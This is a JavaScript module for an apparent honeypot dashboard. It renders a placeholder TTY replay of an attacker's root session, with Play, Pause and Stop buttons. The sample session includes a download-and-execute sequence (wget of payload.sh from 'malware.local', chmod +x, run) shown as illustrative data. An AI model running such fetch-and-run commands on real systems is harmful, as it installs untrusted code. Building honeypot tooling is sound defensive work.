// replay-viewer.js

export function createReplayViewer(ttylogPath) {
    if (!ttylogPath) {
        return `<div class="text-muted">No TTY log available for this session.</div>`;
    }

    // In a real application, this would fetch the binary ttylog and parse it,
    // feeding it into a terminal emulator like xterm.js or a custom player.
    // For the MVP, we render a placeholder terminal screen.

    return `
        <div class="terminal-viewer" id="replay-terminal">
<span class="text-muted">Initializing TTY Replay from:</span> ${ttylogPath}
<span class="text-muted">...</span>

<span style="color: #fff">root@honeypot:~#</span> id
uid=0(root) gid=0(root) groups=0(root)

<span style="color: #fff">root@honeypot:~#</span> uname -a
Linux honeypot 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux

<span style="color: #fff">root@honeypot:~#</span> wget http://malware.local/payload.sh
--2023-10-15 14:22:31--  http://malware.local/payload.sh
Resolving malware.local (malware.local)... 10.0.0.99
Connecting to malware.local (malware.local)|10.0.0.99|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1024 (1.0K) [application/x-sh]
Saving to: 'payload.sh'

payload.sh          100%[===================>]   1.00K  --.-KB/s    in 0s      

2023-10-15 14:22:31 (100 MB/s) - 'payload.sh' saved [1024/1024]

<span style="color: #fff">root@honeypot:~#</span> chmod +x payload.sh
<span style="color: #fff">root@honeypot:~#</span> ./payload.sh
<span style="color: #ff0000">Connection to host lost.</span>
        </div>
        <div style="margin-top: 1rem; display: flex; gap: 0.5rem;">
            <button class="btn btn-primary">Play</button>
            <button class="btn btn-outline">Pause</button>
            <button class="btn btn-outline">Stop</button>
        </div>
    `;
}
